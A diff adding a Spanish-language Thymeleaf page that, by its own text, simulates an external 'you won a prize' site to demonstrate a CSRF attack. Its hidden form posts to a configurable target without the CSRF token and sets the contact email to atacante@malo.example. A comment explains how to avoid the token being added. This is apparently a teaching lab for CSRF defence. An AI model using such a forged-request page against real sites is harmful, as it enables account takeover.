@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="es" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>¡Has ganado un premio!</title>
+    <link rel="stylesheet" href="/estilo.css">
+</head>
+<body>
+<h1>¡Has ganado un premio!</h1>
+<p>Esta página simula una web externa. El botón envía el formulario de <code th:text="${destino}"></code> sin el token CSRF, y cambia el email de contacto a <code>atacante@malo.example</code>.</p>
+
+<!-- th:attr y no th:action: th:action añade el token. -->
+<form th:attr="action=${destino}" method="post">
+    <input type="hidden" name="email" value="atacante@malo.example">
+    <button>Reclamar el premio</button>
+</form>
+</body>
+</html>
